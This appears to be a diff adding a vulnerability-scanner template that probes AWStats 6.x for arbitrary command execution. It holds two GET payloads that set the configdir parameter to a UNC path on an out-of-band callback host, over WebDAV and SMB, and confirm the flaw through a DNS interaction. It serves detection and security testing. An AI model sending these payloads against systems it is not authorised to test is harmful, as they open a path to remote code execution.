@@ -1,0 +1,21 @@
+id: AWStats-RCE
+
+info:
+  name: AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution
+  author: osamahamad
+  severity: high
+  description: https://www.exploit-db.com/exploits/35035
+  reference: https://www.exploit-db.com/exploits/35035
+  tags: custom
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/awstats.cgi?config=attacker&pluginmode=rawlog&configdir=%5C%5C{{interactsh-url}}:80%5Cwebdav"
+      - "{{BaseURL}}/cgi-bin/awstats.cgi?config=attacker&pluginmode=rawlog&configdir=%5C%5C{{interactsh-url}}%5CSMB-Share"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "dns"
